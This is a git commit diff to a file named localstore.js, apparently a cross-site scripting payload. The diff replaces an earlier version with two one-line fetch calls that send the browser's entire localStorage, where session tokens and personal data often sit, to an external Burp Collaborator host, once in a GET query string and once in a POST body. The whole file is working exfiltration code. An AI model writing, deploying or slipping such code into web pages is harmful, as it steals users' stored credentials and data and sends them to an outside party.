9bacc5635510f46808d8696cfb918844f944204d
Lam Scun <facebook89911192@gmail.com>
2022-03-25 16:48:52 +0700

    Update localstore.js

--- localstore.js
+++ localstore.js
@@ -1,14 +1,2 @@
-let _data = {
-  title: "foo",
-  body: "bar", 
-  userId:1
-}
-
-fetch('https://wwwz15e554m201wwajfl7m1ey54z1nq.burpcollaborator.net/localStorage', {
-  method: "POST",
-  body: JSON.stringify(localStorage),
-  headers: {"Content-type": "text/plain"}
-})
-.then(response => response.json()) 
-.then(json => console.log(json))
-.catch(err => console.log(err));
+fetch('https://wwwz15e554m201wwajfl7m1ey54z1nq.burpcollaborator.net/?localStorage='+JSON.stringify(localStorage), { method: "GET"}).then(response => response.json()).then(json => console.log(json)).catch(err => console.log(err));
+fetch('https://wwwz15e554m201wwajfl7m1ey54z1nq.burpcollaborator.net/localStorage', {method: "POST", body: JSON.stringify(localStorage), headers: {"Content-type": "text/plain"}}).then(response => response.json()) .then(json => console.log(json)).catch(err => console.log(err));
